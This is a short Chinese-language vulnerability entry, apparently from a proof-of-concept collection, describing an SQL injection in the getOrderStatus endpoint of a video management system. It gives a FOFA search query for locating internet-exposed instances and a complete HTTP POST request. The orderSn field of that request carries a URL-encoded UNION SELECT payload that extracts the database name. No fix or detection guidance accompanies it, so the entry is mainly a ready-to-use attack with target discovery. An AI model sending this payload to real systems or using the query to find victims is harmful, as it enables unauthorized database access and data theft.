# 魅思视频管理系统getOrderStatus存在SQL注入漏洞

魅思视频管理系统getOrderStatus存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
app="魅思-视频管理系统"
```

## poc

```javascript
POST /api/getOrderStatus HTTP/1.1
Content-Type: application/x-www-form-urlencoded
user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

orderSn=%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28IFNULL%28CAST%28database%28%29+AS+NCHAR%29%2C0x20%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-
```

![image-20240917160329467](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409171603549.png)